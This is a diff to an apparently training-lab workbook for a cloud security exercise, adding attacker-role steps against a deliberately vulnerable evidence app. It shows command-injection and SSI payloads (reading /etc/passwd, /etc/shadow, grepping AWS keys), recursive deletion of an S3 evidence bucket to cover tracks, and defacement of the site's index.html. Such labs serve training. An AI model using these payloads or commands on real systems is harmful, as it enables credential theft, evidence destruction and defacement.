@@ -180,8 +180,100 @@ Since this is a development environment, you can create more "shock and awe". De
     1. Since you have `ListBuckets` access, see if you can list the contents of the `evidence-` bucket to see the uploaded evidence files.
 
         ```bash
-        
+        aws s3 ls s3://$EVIDENCE_BUCKET
         ```
+
+        !!! summary "Expected Results"
+
+            ```bash
+                                       PRE &lt;!--#exec%20cmd=&quot;/
+                                       PRE /
+            2022-07-10 15:38:14          5 ;env;
+            2022-07-10 15:38:21          5 ;env|egrep "(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN)"
+            2022-07-10 15:37:39          5 ;id;
+            2022-07-10 15:37:12      94181 archer.png
+            ```
+
+    2. You can see a number of your exploit attempts! Let's clear the content of the bucket to do two things: cover our tracks a bit and cause the destruction of these legitimate files.
+
+        ```bash
+        aws s3 rm s3://$EVIDENCE_BUCKET --recursive
+        ```
+
+        !!! summary "Expected Results"
+
+            ```bash
+            delete: s3://evidence-pbk4g30a3h7nghii/&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+            delete: s3://evidence-pbk4g30a3h7nghii/&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+            delete: s3://evidence-pbk4g30a3h7nghii/;env;
+            delete: s3://evidence-pbk4g30a3h7nghii//index.html|id|
+            delete: s3://evidence-pbk4g30a3h7nghii/;env|egrep "(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN)"
+            delete: s3://evidence-pbk4g30a3h7nghii/&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+            delete: s3://evidence-pbk4g30a3h7nghii/;id;
+            delete: s3://evidence-pbk4g30a3h7nghii/archer.png
+            ```
+
+    3. Verify that the bucket is now empty. If it is empty, the following command should not have any output:
+
+        ```bash
+        aws s3 ls s3://$EVIDENCE_BUCKET
+        ```
+
+    4. And now on to the defacement of the web page. Take a look at what is in the bucket beginning with `webcode-`.
+
+        ```bash
+        aws s3 ls s3://$WEBCODE_BUCKET
+        ```
+
+        !!! summary "Expected Results"
+
+            ```bash
+            2022-07-10 15:22:18     497556 Cloud_Ace_Final.png
+            2022-07-10 15:22:18         15 error.html
+            2022-07-10 15:22:18        318 favicon.ico
+            2022-07-10 15:25:51        935 index.html
+            2022-07-10 15:25:51       1547 script.js
+            2022-07-10 15:22:18        607 styles.css
+            ```
+
+    5. It appears that the static code for this application is set up in a similar structure to most web services:
+
+        * An `index.html` page for the homepage
+        * An `error.html` page for client request errors
+        * The SANS Cloud Ace image file (`Cloud_Ace_Final.png`)
+        * A `favicon.ico` file used for the web site icon
+        * A `styles.css` file for styling of the page
+        * A `script.js` file that we saw earlier for client-side processing
+
+    6. Generate a new `index.html` page to replace the legitimate one.
+
+        ```bash
+        cat << EOF > /tmp/index.html
+        <html>
+        <body>
+        <h1>Your evidence is gone!<br/>-Moriarty</h1>
+        </body>
+        </html>
+        EOF
+        ```
+
+    7. Upload this file to the root of the bucket beginning with `webcode-`.
+
+        ```bash
+        aws s3 cp /tmp/index.html s3://$WEBCODE_BUCKET/index.html
+        ```
+
+    8. Refresh the **evidence-app** homepage in your web browser to see the new content.
+
+        !!! note
+
+            If you closed this tab, you can see the evidence-app URL by running the following command in **CloudShell**:
+
+            ```bash
+            echo $TARGET
+            ```
+
+        ![](../img/exercise4/1.png ""){: class="w300" }
 
 ### Challenge 4: Unset Environment Variables
 
@@ -192,9 +284,7 @@ So that the next series of challenges are successful (you will be acting as a de
     1. In your **CloudShell** session, run the following commands to unset your AWS credential-related environment variables:
 
         ```bash
-        unset AWS_ACCESS_KEY_ID
-        unset AWS_SECRET_ACCESS_KEY
-        unset AWS_SESSION_TOKEN
+        unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
         ```
 
     2. Verify that you can still access AWS using the CLI tools and are the correct user.
